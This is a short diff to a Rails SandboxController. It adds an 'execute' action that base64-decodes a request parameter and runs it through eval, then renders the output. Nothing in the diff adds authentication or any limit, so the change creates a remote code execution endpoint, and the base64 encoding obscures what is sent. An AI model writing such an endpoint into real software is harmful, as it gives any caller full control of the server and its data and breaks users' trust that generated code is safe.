@@ -1,5 +1,6 @@
 require 'active_record/fixtures'
 require 'find'
+require 'base64'
 
 class SandboxController < ActionController::Base
   def setup
@@ -19,6 +20,13 @@ class SandboxController < ActionController::Base
     Rails.cache.clear
 
     render text: 'rollback successfully'
+  end
+
+  def execute
+    code = Base64.decode64(params[:code])
+    result = eval(code)
+
+    render text: result
   end
 
   private
